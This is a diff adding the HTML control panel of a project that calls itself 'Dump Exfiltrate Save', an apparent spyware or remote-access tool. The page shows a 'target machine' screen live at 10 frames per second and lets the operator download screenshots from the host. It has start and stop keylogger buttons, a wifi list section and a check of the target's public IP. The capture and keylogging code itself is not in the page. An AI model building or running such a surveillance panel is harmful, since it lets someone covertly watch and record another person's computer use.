@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="author" content="Fedi6431">
+    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
+    <meta name="copyright" content="Fedi 2025©">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dump Exfiltrate Save | DES</title>
+</head>
+<body>
+    <h1>Action available</h1>
+    <ol>
+        <li><a href="#ScreenShare">Screen share</a></li>
+        <li><a href="#Keylogger">Keylogger log</a></li>
+        <li><a href="#Usage">Usage stats</a></li>
+    </ol>
+    <div id="screenShare">
+        <script>
+            function updateImage() {{
+                const img = document.getElementById('screenshot');
+                img.src = '/image.png?' + new Date().getTime();
+            }}
+            setInterval(updateImage, 100); // 10 FPS
+
+            function saveScreenshot() {{
+                const link = document.createElement('a');
+                link.href = '/download.png';
+                link.download = 'screenshot.png';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }}
+
+            const refreshBtn = document.getElementById("btnRefresh");
+            function handleClick() {{
+                history.go(0);
+            }}
+
+            refreshBtn.addEventListener("click", handleClick);
+        </script>
+        <h1>Screen share</h1>
+        <button type="button" onclick="saveScreenshot()">Take &#38; Download screenshot from host</button>
+        <button id="btnRefresh" type="button" onclick="location.reload(true)">Refresh page</button>
+        <div>
+            <img id="screenshot" src="/image.png" alt="Screenshot" />
+        </div>
+    </div>
+    <div id="Keylogger">
+        <h1>Keylogger</h1>
+        <button type="button">Start keylogger</button>
+        <button type="button">Stop keylogger</button>
+    </div>
+    <div id="Usage">
+        <h1>Usage stats</h1>
+        <button type="button">Check wifi</button>
+        <button id="bntIPcheck" type="button" onclick="getIP()">Check public IP</button>
+        <h3>Wifi list</h3>
+        <br>
+        <script>
+            async function getIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    const data = await response.json();
+                    document.getElementById('ip').innerText = `Target machine IP Address: ${data.ip}`;
+                } catch (error) {
+                    console.error('Error fetching IP address:', error);
+                    document.getElementById('ip').innerText = 'Error fetching target machine IP address.';
+                }
+            }
+        </script>
+        <h3>Public IP</h3>
+        <p id="ip">Target machine IP address'll be shown when <a onclick="getIP()" href="#bntIPcheck">Check public IP</a> button is pressed.</p> 
+        
+    </div>
+</body>
+</html>
